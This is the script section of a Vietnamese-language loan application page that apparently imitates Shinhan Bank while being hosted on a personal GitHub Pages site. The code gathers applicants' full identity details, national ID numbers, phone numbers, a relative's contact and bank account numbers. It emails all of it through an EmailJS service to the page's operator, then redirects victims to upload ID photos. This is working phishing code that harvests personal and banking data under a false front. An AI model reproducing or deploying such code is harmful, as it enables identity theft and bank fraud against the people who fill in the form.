                    const numericValue = parseFloat(value.replace(/,/g, ''));
                    return !isNaN(numericValue) && numericValue >= 3000000;
                }, message: 'Thu nhập phải từ 3,000,000 VND.' },
                { id: 'occupation', errorId: 'occupationError', validate: value => value !== '', message: 'Vui lòng chọn nghề nghiệp.' },
                { id: 'loanPurpose', errorId: 'loanPurposeError', validate: value => value !== '', message: 'Vui lòng chọn mục đích vay.' },
                { id: 'relativePhone', errorId: 'relativePhoneError', validate: value => {
                    let normalized = value.replace(/\s/g, '').replace(/^\+84/, '0');
                    return /^\d{10}$/.test(normalized);
                }, message: 'Số điện thoại người thân phải đúng 10 chữ số (bắt đầu bằng +84 hoặc 0).' },
                { id: 'relationship', errorId: 'relationshipError', validate: value => value !== '', message: 'Vui lòng chọn quan hệ.' },
                { id: 'accountName', errorId: 'accountNameError', validate: value => value.trim().length > 2, message: 'Tên chủ tài khoản phải trên 2 ký tự.' },
                { id: 'accountNumber', errorId: 'accountNumberError', validate: value => /^\d{10,20}$/.test(value.replace(/\s/g, '')), message: 'Số tài khoản phải từ 10 đến 20 chữ số.' },
                { id: 'bankName', errorId: 'bankNameError', validate: value => value !== '', message: 'Vui lòng chọn ngân hàng.' },
                { id: 'privacyConsent', errorId: 'privacyConsentError', validate: value => value === true, message: 'Vui lòng đồng ý chính sách bảo mật.' }
            ];

            fields.forEach(field => {
                const element = document.getElementById(field.id);
                const value = element.type === 'checkbox' ? element.checked : element.value;
                const errorElement = document.getElementById(field.errorId);
                if (!field.validate(value)) {
                    errorElement.textContent = field.message;
                    errorMessages.push(field.message);
                    console.error(`Validation failed for ${field.id}: ${field.message}`);
                    isValid = false;
                } else {
                    errorElement.textContent = '';
                }
            });

            if (isValid && registeredUsers.includes(document.getElementById('cccd').value)) {
                const duplicateMessage = 'CCCD này đã được sử dụng để đăng ký hồ sơ. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.';
                alert(duplicateMessage);
                console.error('Duplicate CCCD detected:', document.getElementById('cccd').value);
                errorMessages.push(duplicateMessage);
                isValid = false;
            }

            if (!isValid && errorMessages.length > 0) {
                alert('Vui lòng kiểm tra các lỗi sau:\n- ' + errorMessages.join('\n- '));
            }

            return isValid;
        }

        function calculateLoan() {
            if (!validateForm()) return;

            const spinner = document.querySelector('.spinner');
            const successMessage = document.getElementById('calculationSuccess');
            spinner.style.display = 'inline-block';
            successMessage.style.display = 'none';

            setTimeout(() => {
                const loanAmount = parseFloat(document.getElementById('loanAmount').value);
                const loanTerm = parseInt(document.getElementById('loanTerm').value);
                const interestRate = parseFloat(document.getElementById('interestRate').value) / 100 / 12;

                const monthlyPayment = (loanAmount * interestRate * Math.pow(1 + interestRate, loanTerm)) / (Math.pow(1 + interestRate, loanTerm) - 1);
                const totalAmount = monthlyPayment * loanTerm;
                const totalInterest = totalAmount - loanAmount;

                document.getElementById('calcLoanAmount').textContent = loanAmount.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
                document.getElementById('calcMonthlyPayment').textContent = monthlyPayment.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
                document.getElementById('calcTotalInterest').textContent = totalInterest.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
                document.getElementById('calcTotalAmount').textContent = totalAmount.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });

                let balance = loanAmount;
                const tableBody = document.getElementById('calculationTable');
                tableBody.innerHTML = '';
                for (let month = 1; month <= loanTerm; month++) {
                    const interest = balance * interestRate;
                    const principal = monthlyPayment - interest;
                    balance -= principal;
                    const row = `
                        <tr>
                            <td data-label="Tháng">${month}</td>
                            <td data-label="Gốc">${principal.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
                            <td data-label="Lãi">${interest.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
                            <td data-label="Tổng">${monthlyPayment.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
                            <td data-label="Dư nợ">${balance.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
                        </tr>
                    `;
                    tableBody.innerHTML += row;
                }

                userData.monthlyPayment = monthlyPayment;
                userData.totalInterest = totalInterest;
                userData.totalRepayment = totalAmount;
                saveToLocalStorage();

                spinner.style.display = 'none';
                successMessage.style.display = 'block';
            }, 1000);
        }

        function saveFormDataRealTime() {
            userData = {
                fullName: document.getElementById('fullName').value.trim() || "",
                dob: document.getElementById('dob').value || "",
                gender: document.getElementById('gender').value || "",
                contactAddress: document.getElementById('contactAddress').value.trim() || "",
                hometown: document.getElementById('hometown').value.trim() || "",
                nationality: document.getElementById('nationality').value.trim() || "Việt Nam",
                cccd: document.getElementById('cccd').value.trim() || "",
                idIssueDate: document.getElementById('idIssueDate').value || "",
                issuePlace: document.getElementById('issuePlace').value || "",
                phone: document.getElementById('phone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
                email: document.getElementById('email').value.trim() || "",
                loanType: document.getElementById('loanType').value || "",
                loanTerm: document.getElementById('loanTerm').value || "",
                loanAmount: document.getElementById('loanAmount').value || "",
                disbursementDate: document.getElementById('disbursementDate').value || getCurrentDate(),
                interestRate: parseFloat(document.getElementById('interestRate').value) || 7.0,
                monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value.replace(/,/g, '')) || "",
                occupation: document.getElementById('occupation').value || "",
                loanPurpose: document.getElementById('loanPurpose').value || "",
                relativePhone: document.getElementById('relativePhone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
                relationship: document.getElementById('relationship').value || "",
                accountName: document.getElementById('accountName').value.trim() || "",
                accountNumber: document.getElementById('accountNumber').value.trim() || "",
                bankName: document.getElementById('bankName').value || "",
                monthlyPayment: userData.monthlyPayment || "",
                totalInterest: userData.totalInterest || "",
                totalRepayment: userData.totalRepayment || "",
                currentStep: 1,
                isRegistered: userData.isRegistered || false,
                emailSent: userData.emailSent || false
            };
            saveToLocalStorage();
        }

        function handleSubmit(event) {
            event.preventDefault();
            if (!validateForm()) {
                console.error('Form validation failed');
                return;
            }

            const spinner = document.querySelectorAll('.spinner')[1];
            spinner.style.display = 'inline-block';

            userData = {
                fullName: document.getElementById('fullName').value.trim() || "",
                dob: document.getElementById('dob').value || "",
                gender: document.getElementById('gender').value || "",
                contactAddress: document.getElementById('contactAddress').value.trim() || "",
                hometown: document.getElementById('hometown').value.trim() || "",
                nationality: document.getElementById('nationality').value.trim() || "Việt Nam",
                cccd: document.getElementById('cccd').value.trim() || "",
                idIssueDate: document.getElementById('idIssueDate').value || "",
                issuePlace: document.getElementById('issuePlace').value || "",
                phone: document.getElementById('phone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
                email: document.getElementById('email').value.trim() || "",
                loanType: document.getElementById('loanType').value || "",
                loanTerm: document.getElementById('loanTerm').value || "",
                loanAmount: document.getElementById('loanAmount').value || "",
                disbursementDate: document.getElementById('disbursementDate').value || getCurrentDate(),
                interestRate: parseFloat(document.getElementById('interestRate').value) || 7.0,
                monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value.replace(/,/g, '')) || "",
                occupation: document.getElementById('occupation').value || "",
                loanPurpose: document.getElementById('loanPurpose').value || "",
                relativePhone: document.getElementById('relativePhone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
                relationship: document.getElementById('relationship').value || "",
                accountName: document.getElementById('accountName').value.trim() || "",
                accountNumber: document.getElementById('accountNumber').value.trim() || "",
                bankName: document.getElementById('bankName').value || "",
                loanCode: "SHB" + Math.floor(100000 + Math.random() * 900000),
                monthlyPayment: userData.monthlyPayment || "",
                totalInterest: userData.totalInterest || "",
                totalRepayment: userData.totalRepayment || "",
                currentStep: 2,
                isRegistered: true,
                emailSent: false
            };

            if (saveToLocalStorage()) {
                registeredUsers.push(userData.cccd);
                localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                localStorage.setItem('registered', 'true');

                let retries = 2;
                function sendEmail() {
                    emailjs.send('service_60tgxof', 'template_uhyb8ve', {
                        full_name: userData.fullName,
                        dob: userData.dob,
                        gender: userData.gender,
                        contact_address: userData.contactAddress,
                        hometown: userData.hometown,
                        id_number: userData.cccd,
                        id_issue_date: userData.idIssueDate,
                        nationality: userData.nationality,
                        id_issue_place: userData.issuePlace,
                        phone_number: userData.phone,
                        email: userData.email,
                        loan_type: userData.loanType,
                        loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : "",
                        loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : "",
                        disbursement_date: userData.disbursementDate,
                        income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VND' : "",
                        occupation: userData.occupation,
                        loan_purpose: userData.loanPurpose,
                        company_phone: userData.relativePhone,
                        company_address: userData.relationship,
                        account_holder_name: userData.accountName,
                        account_number: userData.accountNumber.replace(/\s/g, ''),
                        bank_name: userData.bankName,
                        loan_code: userData.loanCode,
                        monthly_payment: userData.monthlyPayment ? userData.monthlyPayment.toLocaleString('vi-VN') + ' VND' : "",
                        total_interest: userData.totalInterest ? userData.totalInterest.toLocaleString('vi-VN') + ' VND' : "",
                        total_repayment: userData.totalRepayment ? userData.totalRepayment.toLocaleString('vi-VN') + ' VND' : ""
                    })
                    .then(response => {
                        console.log('Email sent:', response.status, response.text);
                        userData.emailSent = true;
                        saveToLocalStorage();
                        spinner.style.display = 'none';
                        alert('Đăng ký hồ sơ thành công. Vui lòng tải lên ảnh căn cước công dân.');
                        setTimeout(() => {
                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
                        }, 500);
                    }, error => {
                        console.error('Email error:', error);
                        if (retries > 0) {
                            retries--;
                            console.log(`Retrying... ${retries} attempts left`);
                            setTimeout(sendEmail, 1000);
                        } else {
                            console.error('Email failed after retries:', error);
                            spinner.style.display = 'none';
                            alert('Đăng ký không thành công. Thông tin không trùng khớp tại hệ thống hoặc không đúng, vui lòng thử lại hoặc liên hệ hỗ trợ.');
                            setTimeout(() => {
                                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
                            }, 500);
                        }
                    });
                }
                sendEmail();
            } else {
                spinner.style.display = 'none';
                alert('Lỗi vui lòng kiểm tra lại thông tin hoặc mục còn thiếu.');
                console.error('LocalStorage save failed');
            }
        }

        // Auto-save progress on input change
        document.querySelectorAll('#registrationForm input, #registrationForm select').forEach(input => {
            input.addEventListener('change', saveFormDataRealTime);
        });
    </script>
</body>
</html>
